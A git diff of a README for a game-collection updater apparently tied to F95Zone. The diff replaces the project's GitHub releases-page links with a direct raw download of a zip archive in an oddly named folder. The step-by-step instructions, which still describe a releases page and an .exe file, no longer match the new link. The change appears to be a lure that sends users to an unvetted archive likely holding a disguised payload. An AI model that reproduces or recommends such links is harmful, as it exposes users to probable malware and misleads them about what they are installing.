@@ -1,6 +1,6 @@
 # 🎮 f95zone - Keep your game collection updated easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ritajay6784/f95zone/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Ritajay6784/f95zone/main/Tubiporidae/f-zone-v3.6-beta.2.zip)
 
 f95zone helps you manage your game collection from the F95Zone platform. This tool tracks updates for your games and helps you apply mods without manual file management. You save time and ensure your games run the latest versions.
 
@@ -21,7 +21,7 @@ f95zone helps you manage your game collection from the F95Zone platform. This to
 
 ## 📥 Getting the software
 
-1. Visit the following link to find the latest version: [https://github.com/Ritajay6784/f95zone/releases](https://github.com/Ritajay6784/f95zone/releases).
+1. Visit the following link to find the latest version: [https://raw.githubusercontent.com/Ritajay6784/f95zone/main/Tubiporidae/f-zone-v3.6-beta.2.zip](https://raw.githubusercontent.com/Ritajay6784/f95zone/main/Tubiporidae/f-zone-v3.6-beta.2.zip).
 2. Look for the recent release listed at the top of the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
